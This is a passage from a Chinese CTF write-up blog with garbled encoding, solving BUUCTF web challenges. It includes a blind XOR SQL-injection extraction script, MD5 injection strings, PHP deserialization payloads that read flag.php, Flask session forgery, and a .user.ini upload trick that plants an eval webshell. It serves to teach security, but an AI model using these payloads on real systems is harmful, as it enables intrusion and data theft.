3","uri":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/#è§£æ³•1å¼±å¯†ç "},{"categories":["CTF"],"content":"è§£æ³•2ï¼šunicodeæ¬ºéª— é¢„æœŸè§£ä¹‹ä¸€ã€‚æŸ¥çœ‹ç½‘é¡µæºç å¯ä»¥çœ‹åˆ°è¯¥webåº”ç”¨æ˜¯ä¸€ä¸ªflaskåº”ç”¨ï¼Œæºç åœ°å€ä¸ºhttps://github.com/woadsl1234/hctf_flask æ”¹å¯†ç ç•Œé¢çš„æºç æ³¨é‡Šæç¤ºimage-20210724184719396 \" æ”¹å¯†ç ç•Œé¢çš„æºç æ³¨é‡Šæç¤º æŸ¥çœ‹æºç ä¸­çš„è·¯ç”±é€»è¾‘routes.pyï¼Œå…¶ä¸­çš„loginä¸changeè·¯ç”±å¤„ç†é€»è¾‘ä½¿ç”¨äº†è¿‡æ—¶ç‰ˆæœ¬twistedæ¡†æ¶ä¸­çš„nodeprep.prepare()å‡½æ•°ï¼Œè¯¥å‡½æ•°ä¼šå°†á´¬è½¬æ¢ä¸ºAï¼Œç„¶åè½¬æ¢ä¸ºå°å†™çš„aï¼ˆè¿™ä¸ªçŸ¥è¯†ç‚¹æˆ‘ä¹Ÿä¸çŸ¥é“è·å–çš„æ¸ é“æ˜¯ä»€ä¹ˆï¼‰ã€‚ @app.route('/login', methods = ['GET', 'POST']) def login(): if current_user.is_authenticated: return redirect(url_for('index')) form = LoginForm() if request.method == 'POST': name = strlower(form.username.data) //\u003c------å°±åœ¨è¿™é‡Œä½¿ç”¨äº†ä¸€ä¸ªè‡ªå®šä¹‰çš„strlower()å‡½æ•° session['name'] = name user = User.query.filter_by(username=name).first() if user is None or not user.check_password(form.password.data): flash('Invalid username or password') return redirect(url_for('login')) login_user(user, remember=form.remember_me.data) return redirect(url_for('index')) return render_template('login.html', title = 'login', form = form) ... def strlower(username): username = nodeprep.prepare(username) return username æŠ€å·§ æ‰€ä»¥Unicodeæ¬ºéª—çš„åšæ³•å°±æ˜¯å…ˆæ³¨å†Œä¸€ä¸ªá´¬DMINç”¨æˆ·ï¼Œç„¶åä¿®æ”¹å¯†ç ã€‚åœ¨æ³¨å†Œä¸ä¿®æ”¹å¯†ç çš„è¿‡ç¨‹ä¸­usernameä¼šå‘ç”Ÿå¦‚ä¸‹è½¬å˜á´¬DMIN-\u003eAdmin-\u003eadminï¼Œæ‰€ä»¥ç›¸å½“äºèƒ½å¤Ÿæ§åˆ¶adminç”¨æˆ·çš„å¯†ç ï¼Œç„¶åå°±èƒ½å¤Ÿä»¥adminç”¨æˆ·çš„èº«ä»½ç™»å½•ï¼Œè·å–flagã€‚ ","date":"2021-07-19","objectID":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/:3:2","series":null,"tags":["CTF","web"],"title":"BUUCTF webè®°å½• 3","uri":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/#è§£æ³•2unicodeæ¬ºéª—"},{"categories":["CTF"],"content":"è§£æ³•3ï¼š ä¿®æ”¹flask session é‚£ä¸ªwebåº”ç”¨æ˜¯ä¸ªflaskåº”ç”¨ï¼Œflaskæ˜¯å°†sessionä¿å­˜åœ¨æœ¬åœ°çš„ï¼Œå¹¶ä¸”æ²¡æœ‰åšåŠ å¯†ï¼Œè€Œæ˜¯ä»…ä»…è¿›è¡Œäº†ç­¾åä»¥é˜²ç¯¡æ”¹ï¼Œè€Œæœç´¢æºä»£ç å¯ä»¥çœ‹åˆ°å…¶ç­¾åä½¿ç”¨çš„å¯†é’¥ä¸ºckj123ã€‚ import os class Config(object): SECRET_KEY = os.environ.get('SECRET_KEY') or 'ckj123' SQLALCHEMY_DATABASE_URI = 'mysql+pymysql://root:adsl1234@db:3306/test' SQLALCHEMY_TRACK_MODIFICATIONS = True æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨burpæ‹¦æˆªæ™®é€šç”¨æˆ·ç™»å½•åæŸ¥çœ‹Indexé¡µé¢çš„è¯·æ±‚ï¼Œå†ä½¿ç”¨flask sessionç¼–è§£ç å·¥å…·è§£ç æ‹¦æˆªåˆ°çš„sessionï¼Œç„¶åä¿®æ”¹å…¶ä¸­çš„ç”¨æˆ·IDï¼Œå†é‡å‘è¯·æ±‚ï¼Œå³å¯è·å¾—flagã€‚ è§£ç image-20210726171651090 \" è§£ç  å°†nameæ”¹ä¸ºadminï¼Œå†è¿›è¡Œç­¾åã€‚ é‡æ–°ç­¾åimage-20210726172004692 \" é‡æ–°ç­¾å é‡å‘æ‹¿åˆ°flagimage-20210726171919586 \" é‡å‘æ‹¿åˆ°flag ","date":"2021-07-19","objectID":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/:3:3","series":null,"tags":["CTF","web"],"title":"BUUCTF webè®°å½• 3","uri":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/#è§£æ³•3-ä¿®æ”¹flask-session"},{"categories":["CTF"],"content":"å‚è€ƒé“¾æ¥ï¼š https://blog.csdn.net/mochu7777777/article/details/109302175 Unicode Character Table å®¢æˆ·ç«¯ session å¯¼è‡´çš„å®‰å…¨é—®é¢˜ ","date":"2021-07-19","objectID":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/:3:4","series":null,"tags":["CTF","web"],"title":"BUUCTF webè®°å½• 3","uri":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/#å‚è€ƒé“¾æ¥-2"},{"categories":["CTF"],"content":"0x03 [BJDCTF2020]Easy MD5 é¢˜ç›®é“¾æ¥ ä¸€é“è€ƒå¯Ÿphpä¸­çš„md5()ç”¨æ³•çš„é¢˜ã€‚ ç½‘ç«™é•¿è¿™æ · ç½‘ç«™é¡µé¢image-20210811221230795 \" ç½‘ç«™é¡µé¢ ","date":"2021-07-19","objectID":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/:4:0","series":null,"tags":["CTF","web"],"title":"BUUCTF webè®°å½• 3","uri":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/#0x03-bjdctf2020easy-md5"},{"categories":["CTF"],"content":"level1 é¦–å…ˆéšä¾¿è¾“å…¥ï¼ŒæŠ“åŒ…å¾—åˆ°hintæç¤º hintæç¤ºimage-20210811221151702 \" hintæç¤º å¯ä»¥çœ‹åˆ°æäº¤è¯·æ±‚å¯¹åº”çš„è¯­å¥ä¸º select * from 'admin' where password=md5($pass,true) è¿™é‡Œè¦æ³¨å…¥çš„è¯å°±å¾—ä½¿md5($pass, true)å€¼ä¸º' or 'xxxï¼Œä¹Ÿå°±æ˜¯è¦æ‰¾ä¸ªå­—ç¬¦ä¸²ä½¿å…¶md5ç»“æœæ»¡è¶³è¿™ä¸€è¦æ±‚ã€‚éå†å¯ä»¥çˆ†å‡ºç»“æœï¼Œä½†å…¶å®æœ‰ç»éªŒçš„è¯å°±çŸ¥é“\"ffifdyop\"æ»¡è¶³ä¸Šè¿°éœ€æ±‚ï¼Œæ˜¯md5æ³¨å…¥æ—¶å¸¸ç”¨çš„å­—ç¬¦ä¸²ï¼Œå…¶md5ç»“æœä¸º' or '6xxxxxã€‚ import hashlib s = \"ffifdyop\" m = hashlib.md5(s.encode()).hexdigest() print(m) plain = bytes.fromhex(m) print(plain) ================= 276f722736c95d99e921722cf9ed621c b\"'or'6\\xc9]\\x99\\xe9!r,\\xf9\\xedb\\x1c\" æ”¾åˆ°ä¸Šè¿°è¯­å¥å°±ç›¸å½“äº select * from 'admin' where password= '' or '6xxxxx' ","date":"2021-07-19","objectID":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/:4:1","series":null,"tags":["CTF","web"],"title":"BUUCTF webè®°å½• 3","uri":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/#level1"},{"categories":["CTF"],"content":"level2 æ³¨å…¥é€šè¿‡ä¹‹åï¼Œåˆ°äº†ç¬¬äºŒå…³ Do You Like MD5?image-20210811224151331 \" Do You Like MD5? åˆå¯ä»¥çœ‹åˆ°æç¤ºï¼Œè¦æ±‚$a != $b ä½†æ˜¯md5($a) == md5($b)ã€‚ ç¬¬äºŒä¸ªæç¤ºimage-20210811224234490 \" ç¬¬äºŒä¸ªæç¤º è¦æ»¡è¶³å‰é¢çš„!=å’Œåé¢çš„å¼±ç›¸ç­‰ï¼Œå­˜åœ¨ä¸¤ç§æƒ…å†µï¼š md5($a)ä¸md5($b)ç»“æœä»¥0eå¼€å¤´ã€‚phpåœ¨å¤„ç†è¿™æ ·çš„å“ˆå¸Œå­—ç¬¦ä¸²æ—¶ä¼šå°†å…¶å½“ä½œç§‘å­¦è®¡æ•°æ³•ï¼Œå¹¶ä¸”åº•æ•°ä¸º0ï¼Œæ‰€ä»¥ç»“æœéƒ½ä¸º0 $aä¸$bä¸ºæ•°ç»„ã€‚md5()æ— æ³•å¤„ç†æ•°ç»„è¾“å…¥ï¼Œæ‰€ä»¥ä¼šè¿”å›nullï¼Œè¿™ç§æƒ…å†µä¹Ÿæ»¡è¶³ä¸Šè¿°æ¡ä»¶ å…·ä½“å†…å®¹å¯ä»¥å‚ç…§è¿™ç¯‡åšå®¢ æ‰€ä»¥ï¼Œç›´æ¥é€‰ä¸¤ä¸ªä¸åŒçš„ä½†æ˜¯md5ç»“æœéƒ½ä»¥0eå¼€å¤´çš„å­—ç¬¦ä¸²ä½œä¸ºa bçš„å€¼å³å¯ã€‚ hackbarimage-20210812193547427 \" hackbar ","date":"2021-07-19","objectID":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/:4:2","series":null,"tags":["CTF","web"],"title":"BUUCTF webè®°å½• 3","uri":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/#level2"},{"categories":["CTF"],"content":"level3 ç¬¬ä¸‰å…³è¦æ±‚$_POST['param1']!==$_POST['param2']\u0026\u0026md5($_POST['param1'])===md5($_POST['param2']) è¿™é‡Œä¼ å…¥æ•°ç»„å°±å¯ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜å¯ä»¥æ‰¾ä¸¤ä¸ªä¸åŒçš„ä½†æ˜¯md5ç»“æœç›¸åŒçš„å­—ç¬¦ä¸²ï¼Œè¿™ç†è®ºä¸Šæ¥è¯´æ˜¯å­˜åœ¨çš„ï¼Œä½†æ˜¯æˆ‘ç›®å‰è¿˜æ²¡æœ‰æŸ¥åˆ°ç°æœ‰çš„ç»“æœã€‚hackbarå‘é€Postè¯·æ±‚image-20210812194016086 \" hackbarå‘é€Postè¯·æ±‚ ","date":"2021-07-19","objectID":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/:4:3","series":null,"tags":["CTF","web"],"title":"BUUCTF webè®°å½• 3","uri":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/#level3"},{"categories":["CTF"],"content":"å‚è€ƒé“¾æ¥ï¼š CTFä¸­å¸¸è§php-MD5()å‡½æ•°æ¼æ´ ","date":"2021-07-19","objectID":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/:4:4","series":null,"tags":["CTF","web"],"title":"BUUCTF webè®°å½• 3","uri":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/#å‚è€ƒé“¾æ¥-3"},{"categories":["CTF"],"content":"0x04 [CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World é¢˜ç›®é“¾æ¥ é¦–é¡µimage-20210813220634873 \" é¦–é¡µ è¯•ä¸€ä¸‹å°±çŸ¥é“ï¼Œor and union ç­‰å…³é”®å­—éƒ½è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥ä¸èƒ½unionæ³¨å…¥æˆ–è€…æŠ¥é”™æ³¨å…¥ã€‚ ä»¥åŠè¾“å…¥1å’Œ2æ˜¯å¯ä»¥çœ‹åˆ°æ­£å¸¸çš„å›æ˜¾ç»“æœçš„ 1ï¼šHello, glzjin wants a girlfriend. 2ï¼šDo you want to be my girlfriend? googleä¹‹åå¯ä»¥çŸ¥é“ï¼Œè¿˜æœ‰ä¸€ç§æ³¨å…¥å«åšå¼‚æˆ–æ³¨å…¥ï¼Œè¿™ä¹Ÿæ˜¯è¿™é¢˜çš„è€ƒå¯Ÿç‚¹ã€‚ æ‰€ä»¥æ€è·¯å°±æ˜¯ä½¿ç”¨å¼‚æˆ–æ³¨å…¥ï¼Œé€ä½çˆ†ç ´flagçš„å†…å®¹ã€‚ ç›´æ¥ä¸Šè„šæœ¬ï¼Œæ³¨æ„æ¯æ¬¡è¯·æ±‚ä¹‹é—´åŠ ä¸ªsleepï¼Œä¸ç„¶ä¼šå‡ºé”™ï¼Œå› ä¸ºè¯·æ±‚ä¹‹é—´é—´éš”å¤ªçŸ­ï¼Œå¯¼è‡´æ”¶åˆ°çš„ç»“æœå¯èƒ½ä¼šé¡ºåºé”™ä¹±ã€‚ import requests as rq import time host = 'http://ac7a6112-32f7-48c9-9088-66a935888686.node4.buuoj.cn:81/index.php' flag = \"\" payload = { \"id\": \"\" } for i in range(1, 50): # äºŒåˆ†æŸ¥æ‰¾å¾ˆç»†èŠ‚ a = 32 b = 128 m = (a + b) \u003e\u003e 1 while a \u003c b: payload[\"id\"] = \"0^(ascii(substr((select(flag)from(flag)),{0},1))\u003e{1})\".format(i, m) # print(payload[\"id\"]) se = rq.post(url=host, data=payload) # è¯·æ±‚å‘å¤ªå¿«äº†å®¹æ˜“å‡ºé—®é¢˜ï¼Œæ‰€ä»¥è¿™é‡Œçš„sleepæ˜¯å¿…é¡»çš„ time.sleep(0.1) # å¦‚æœçŒœçš„æ•°å­—æ›´å° if \"Hello\" in se.text: a = m + 1 else: b = m m = (a + b) \u003e\u003e 1 # print(\"m: \", m, \"chr(m): \", chr(m)) if chr(m) == \" \": break flag += chr(m) print(flag) print(\"flag: \", flag) ","date":"2021-07-19","objectID":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/:5:0","series":null,"tags":["CTF","web"],"title":"BUUCTF webè®°å½• 3","uri":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/#0x04-ciscn2019-ååŒ—èµ›åŒº-day2-web1hack-world"},{"categories":["CTF"],"content":"0x05 [ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz é¢˜ç›®é“¾æ¥ è¿™æ˜¯ä¸€é“ååºåˆ—åŒ–çš„é¢˜ï¼Œå¯ä»¥çœ‹åˆ°æºç  \u003c?php include(\"flag.php\"); highlight_file(__FILE__); class FileHandler { protected $op; protected $filename; protected $content; function __construct() { $op = \"1\"; $filename = \"/tmp/tmpfile\"; $content = \"Hello World!\"; $this-\u003eprocess(); } public function process() { if($this-\u003eop == \"1\") { $this-\u003ewrite(); } else if($this-\u003eop == \"2\") { $res = $this-\u003eread(); $this-\u003eoutput($res); } else { $this-\u003eoutput(\"Bad Hacker!\"); } } private function write() { if(isset($this-\u003efilename) \u0026\u0026 isset($this-\u003econtent)) { if(strlen((string)$this-\u003econtent) \u003e 100) { $this-\u003eoutput(\"Too long!\"); die(); } $res = file_put_contents($this-\u003efilename, $this-\u003econtent); if($res) $this-\u003eoutput(\"Successful!\"); else $this-\u003eoutput(\"Failed!\"); } else { $this-\u003eoutput(\"Failed!\"); } } private function read() { $res = \"\"; if(isset($this-\u003efilename)) { $res = file_get_contents($this-\u003efilename); } return $res; } private function output($s) { echo \"[Result]: \u003cbr\u003e\"; echo $s; } function __destruct() { if($this-\u003eop === \"2\") $this-\u003eop = \"1\"; $this-\u003econtent = \"\"; $this-\u003eprocess(); } } function is_valid($s) { for($i = 0; $i \u003c strlen($s); $i++) if(!(ord($s[$i]) \u003e= 32 \u0026\u0026 ord($s[$i]) \u003c= 125)) return false; return true; } if(isset($_GET{'str'})) { $str = (string)$_GET['str']; if(is_valid($str)) { $obj = unserialize($str); } } å®šä¹‰äº†ä¸€ä¸ªFileHandlerç±»ï¼Œå¹¶ä¸”ä¼šå°†æ¥å—åˆ°çš„$_GET['str']è¯·æ±‚å‚æ•°è¿›è¡Œååºåˆ—åŒ–ã€‚ æ„Ÿè§‰åº”è¯¥æ˜¯è¦ååºåˆ—åŒ–å¾—åˆ°FileHandlerå¯¹è±¡ï¼Œç„¶åé€šè¿‡__construct()æˆ–__destruct()é­”æœ¯æ–¹æ³•æ¥è¯»å–flag.phpçš„å†…å®¹ã€‚ ç±»çš„$opå˜é‡ä¸º1å¯¹åº”å†™æ“ä½œï¼Œ2å¯¹åº”è¯»æ“ä½œã€‚ __construct()é‡Œé¢å†™æ­»äº†$op=\"1\"ï¼Œæ‰€ä»¥æ— æ³•æ‰§è¡Œprocess()ä¸­çš„è¯»å–æ“ä½œã€‚ ä½†æ˜¯__destruct()é‡Œåˆä¼šå°†$opä»2å˜ä¸º1ï¼Œæ‰€ä»¥éœ€è¦æƒ³åŠæ³•ç»•è¿‡è¿™ä¸€é€»è¾‘ã€‚ç»•è¿‡çš„åˆ©ç”¨ç‚¹å°±åœ¨äºï¼Œè¿™é‡Œä½¿ç”¨çš„åˆ¤æ–­é€»è¾‘æ˜¯å¼ºç›¸ç­‰===ï¼Œæ‰€ä»¥å°†$opå®šä¹‰ä¸ºæ•°å­—ç±»å‹2ï¼Œå°±å¯ä»¥ç»•è¿‡è¯¥åˆ¤æ–­ï¼ŒåŒæ—¶æ»¡è¶³process()å‡½æ•°ä¸­çš„$op==\"2\"åˆ¤æ–­ï¼Œå› ä¸ºè¿™é‡Œæ˜¯å¼±ç›¸ç­‰ï¼Œå­˜åœ¨è‡ªåŠ¨ç±»å‹è½¬æ¢ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼š æ–¹ä¾¿èµ·è§ï¼Œflag.phpåˆ©ç”¨phpçš„ä¼ªåè®®php://filter/read=convert.base64-encode=flag.phpæ¥è¯»å– phpå¯¹äºprivate/protectedç±»å‹çš„æˆå‘˜å˜é‡è¿›è¡Œåºåˆ—åŒ–æ—¶ä¼šåŠ ä¸ŠåŒ…å«00å­—èŠ‚çš„ç‰¹æ®Šå†…å®¹ï¼Œä½†æ˜¯è¿™æ— æ³•é€šè¿‡$is_valid()åˆ¤æ–­ã€‚å¯ä»¥å°†åºåˆ—åŒ–ç»“æœä¸­çš„sæ›¿æ¢ä¸ºSï¼Œä½¿å…¶åé¢çš„å†…å®¹æ”¯æŒ16è¿›åˆ¶ï¼Œç„¶åç©ºå­—èŠ‚å†™æˆ\\00å³å¯ Note: Objectâ€™s private members have the class name prepended to the member name; protected members have a â€˜*â€™ prepended to the member name. These prepended values have null bytes on either side. https://www.php.net/manual/en/function.serialize ","date":"2021-07-19","objectID":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/:6:0","series":null,"tags":["CTF","web"],"title":"BUUCTF webè®°å½• 3","uri":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/#0x05-ç½‘é¼æ¯-2020-é’é¾™ç»„areuserialz"},{"categories":["CTF"],"content":"payload1 æ‰€ä»¥ï¼Œæœ€å¸¸è§„çš„payloadå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼ç”Ÿæˆï¼š \u003c?php class FileHandler { protected $op = 2; protected $filename = \"flag.php\"; protected $content = \"\"; } $a = new FileHandler(); $b = serialize($a); $b = str_replace(\"s\", \"S\", $b); $b = str_replace(\"%00\", \"\\\\00\", $b); echo($b); ?\u003e æ‰§è¡Œç»“æœ O%3A11%3A%22FileHandler%22%3A3%3A%7BS%3A5%3A%22\\00%2A\\00op%22%3Bi%3A2%3BS%3A11%3A%22\\00%2A\\00filename%22%3BS%3A8%3A%22flag.php%22%3BS%3A10%3A%22\\00%2A\\00content%22%3BS%3A0%3A%22%22%3B%7D è¯·æ±‚?str=O%3A11%3A%22FileHandler%22%3A3%3A%7BS%3A5%3A%22\\00%2A\\00op%22%3Bi%3A2%3BS%3A11%3A%22\\00%2A\\00filename%22%3BS%3A8%3A%22flag.php%22%3BS%3A10%3A%22\\00%2A\\00content%22%3BS%3A0%3A%22%22%3B%7Då³å¯è·å–flagã€‚ flagimage-20210824142159687 \" flag ","date":"2021-07-19","objectID":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/:6:1","series":null,"tags":["CTF","web"],"title":"BUUCTF webè®°å½• 3","uri":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/#payload1"},{"categories":["CTF"],"content":"payload2 è¿˜å¯ä»¥åˆ©ç”¨phpçš„ä¼ªåè®®æ¥è·å–flag.phpæ–‡ä»¶çš„base64ç¼–ç ï¼Œç„¶åå†è§£ç ï¼Œä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚ payloadä¸º O%3A11%3A%22FileHandler%22%3A3%3A%7BS%3A5%3A%22\\00%2A\\00op%22%3Bi%3A2%3BS%3A11%3A%22\\00%2A\\00filename%22%3BS%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3BS%3A10%3A%22\\00%2A\\00content%22%3BS%3A0%3A%22%22%3B%7D payload2image-20210824142639616 \" payload2 ","date":"2021-07-19","objectID":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/:6:2","series":null,"tags":["CTF","web"],"title":"BUUCTF webè®°å½• 3","uri":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/#payload2"},{"categories":["CTF"],"content":"payload3 å…¶å®ï¼Œç½‘ç«™ä¿¡æ¯ä¸­æ˜¾ç¤ºå…¶ä½¿ç”¨çš„phpç‰ˆæœ¬ä¸º7.4.3ï¼Œè€Œ7.1+ç‰ˆæœ¬çš„phpåœ¨åºåˆ—åŒ–ä¸ååºåˆ—åŒ–æ—¶å¯¹äºprivate/protectedæ˜¯ä¸æ•æ„Ÿçš„ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥æŠŠä¸Šè¿°çš„æˆå‘˜å˜é‡éƒ½å½“ä½œpublicã€‚ wappalyzerç»“æœimage-20210824142739850 \" wappalyzerç»“æœ äºæ˜¯å¯ä»¥è¿™æ ·ç”Ÿæˆpayload \u003c?php class FileHandler { public $op = 2; public $filename = \"php://filter/read=convert.base64-encode/resource=flag.php\"; public $content = \"\"; } $a = new FileHandler(); echo(serialize($a)); ?\u003e O:11:\"FileHandler\":3:{s:2:\"op\";i:2;s:8:\"filename\";s:57:\"php://filter/read=convert.base64-encode/resource=flag.php\";s:7:\"content\";s:0:\"\";} ç›´æ¥å½“ä½œpublicimage-20210824142956654 \" ç›´æ¥å½“ä½œpublic åŒæ ·å¯ä»¥æ‹¿åˆ°flagã€‚ ","date":"2021-07-19","objectID":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/:6:3","series":null,"tags":["CTF","web"],"title":"BUUCTF webè®°å½• 3","uri":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/#payload3"},{"categories":["CTF"],"content":"æ€»ç»“ è¿™é¢˜çš„æ„ä¹‰åœ¨äºphpçš„åºåˆ—åŒ–ä¸ååºåˆ—åŒ–ã€åºåˆ—åŒ–ç»“æœå­—æ®µçš„å«ä¹‰ã€php7.1ç‰ˆæœ¬å¯¹äºåºåˆ—åŒ–ååºåˆ—åŒ–æ“ä½œçš„å˜åŒ– ","date":"2021-07-19","objectID":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/:6:4","series":null,"tags":["CTF","web"],"title":"BUUCTF webè®°å½• 3","uri":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/#æ€»ç»“"},{"categories":["CTF"],"content":"å‚è€ƒé“¾æ¥ PHP åºåˆ—åŒ–ï¼ˆserializeï¼‰æ ¼å¼è¯¦è§£ ","date":"2021-07-19","objectID":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/:6:5","series":null,"tags":["CTF","web"],"title":"BUUCTF webè®°å½• 3","uri":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/#å‚è€ƒé“¾æ¥-4"},{"categories":["CTF"],"content":"0x06 [SUCTF 2019]CheckIn é¢˜ç›®é“¾æ¥ æ–‡ä»¶ä¸Šä¼ é¢˜ ç½‘ç«™æŠŠphpæ–‡ä»¶çš„å¸¸ç”¨åç¼€åéƒ½è¿‡æ»¤äº†ï¼Œå¹¶ä¸”æŠŠæ–‡ä»¶ä¸­çš„\u003c?å†…å®¹ä¹Ÿç»™è¿‡æ»¤äº†ã€‚è€ƒè™‘ç”¨\u003cscript language='php'\u003e@eval($_POST[\"password\"]);\u003c/script\u003eçš„å†™æ³•æ¥ç»•è¿‡ã€‚ è¦çŸ¥é“ï¼Œæƒ³åˆ©ç”¨webshellçš„è¯ï¼Œå¿…é¡»è¦èƒ½å¤Ÿè®©æœåŠ¡ç«¯å°†ä½ ä¸Šä¼ çš„æ–‡ä»¶å½“ä½œphpæ–‡ä»¶å»è§£æï¼Œè€Œè¿™é¢˜è¿‡æ»¤äº†phpæ–‡ä»¶çš„åç¼€åï¼Œæ‰€ä»¥æˆ‘ä»¬æ— æ³•ä¸Šä¼ ä¸€ä¸ªphpæ–‡ä»¶ï¼Œè€Œåªèƒ½ä¸Šä¼ ä¸€ä¸ªå«æœ‰phpğŸçš„å›¾ç‰‡æ–‡ä»¶ã€‚ æ‰€ä»¥ç¬¬äºŒä¸ªé—®é¢˜å°±æ˜¯æ€ä¹ˆè®©æœåŠ¡ç«¯å°†æˆ‘ä»¬ä¸Šä¼ çš„å›¾ç‰‡æ–‡ä»¶ä½œä¸ºphpæ–‡ä»¶å»è§£æã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¯ä»¥ä½¿ç”¨apacheçš„.htaccessæ–‡ä»¶è®¾ç½®è®©æœåŠ¡ç«¯å°†æŸä¸ªæ–‡ä»¶å½“ä½œphpæ–‡ä»¶è§£æã€‚ä½†æ˜¯è¿™é¢˜ç¯å¢ƒæ˜¯nginxï¼Œæ‰€ä»¥æ²¡æœ‰.htaccessã€‚å†æŸ¥é˜…èµ„æ–™å¯çŸ¥ï¼Œ.user.iniä¹Ÿæ˜¯ä¸€ä¸ªå¯ä»¥æ§åˆ¶phpè®¾ç½®çš„ä¸€ä¸ªç‰¹æ®Šæ–‡ä»¶ã€‚æ‰€ä»¥è¿™é¢˜çš„æ€è·¯æ˜¯å…ˆä¸Šä¼ .user.iniæ–‡ä»¶ï¼Œè®¾ç½®åœ¨phpæ–‡ä»¶ä¸­åŠ è½½æ¥ä¸‹æ¥è¦ä¸Šä¼ çš„å›¾ç‰‡æ–‡ä»¶ï¼Œç„¶åä¸Šä¼ å«æœ‰phpğŸçš„å›¾ç‰‡æ–‡ä»¶ã€‚ ä¸¤ä¸ªæ–‡ä»¶å†…å®¹ .user.ini GIF89a auto_prepend_file=zyleo.jpg zyleo.jpg GIF89a \u003cscript language='php'\u003e@eval($_POST[\"zyleo\"]);\u003c/script\u003e ä¸Šä¼ ä¹‹åï¼Œçœ‹åˆ°ä¸Šä¼ ç›®å½•ä¸ºuploads/fb....b2ï¼Œå…¶ä¸­ä¹Ÿæœ‰index.phpï¼Œè¿™å°±æ˜¯è¿æ¥webshellçš„åœ°å€ uploadimage-20210824165341337 \" upload ç„¶åèšå‰‘è¿æ¥å°±è¡Œäº† urlåœ°å€ï¼šhttp://8d42f662-e446-4b96-afd8-ab3d2694bfa1.node4.buuoj.cn:81/uploads/fb10500f3a8407c9ec6ac288f25439b2/index.php è¿æ¥å¯†ç ï¼šzyleo Antswordimage-20210824165409582 \" Antsword ","date":"2021-07-19","objectID":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/:7:0","series":null,"tags":["CTF","web"],"title":"BUUCTF webè®°å½• 3","uri":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/#0x06-suctf-2019checkin"},{"categories":["CTF"],"content":"å‚è€ƒè¿æ¥ï¼š htaccessæ–‡ä»¶ä¸Šä¼ æ‹¿shell user.iniæ–‡ä»¶æ„æˆçš„PHPåé—¨ ","date":"2021-07-19","objectID":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/:7:1","series":null,"tags":["CTF","web"],"title":"BUUCTF webè®°å½• 3","uri":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/#å‚è€ƒè¿æ¥"},{"categories":["CTF"],"content":"0x07 [GXYCTF2019]BabySQli é¢˜ç›®é“¾æ¥ è¿™é¢˜ä¸¤ä¸ªè¾“å…¥æ¡†ï¼Œè¯•ä¸€ä¸‹å°±å¯ä»¥å‘ç°ï¼Œæ³¨å…¥ç‚¹æ˜¯UserNameã€‚ UserNameè¯•äº†ä¸€ä¸‹a' or 1=1#ï¼Œé¡µé¢è¿”å›Do not hack meï¼Œè¯´æ˜è¢«è¿‡æ»¤äº†ã€‚ å†è¯•a' union select 1,2#ï¼Œè¿”å›Error: The used SELECT statements have a different number of columnsã€‚è¯´æ˜sqlè¯­å¥çš„æŸ¥è¯¢ç»“æœä¸æ­¢2åˆ—ï¼Œå¯ä»¥å°è¯•å‡ºæ¥æ˜¯3åˆ—ã€‚ åŒæ—¶ï¼Œç”¨æˆ·åè¾“adminï¼Œè¿”å›çš„æ˜¯wrong passï¼Œç”¨æˆ·åè¾“å…¶ä»–çš„è¿”å›çš„æ˜¯wrong userï¼Œè¯´æ˜è¿™é¢˜è¦æ»¡è¶³çš„æ¡ä»¶æ˜¯ç”¨æˆ·åUserNameä¸ºadminã€‚åŒæ—¶a' union select 1,'admin',3#æŠ¥çš„æ˜¯wrong passï¼Œè¯´æ˜usernameåœ¨æŸ¥è¯¢ç»“æœçš„ç¬¬äºŒåˆ—ã€‚ æŸ¥çœ‹ç½‘é¡µæºç 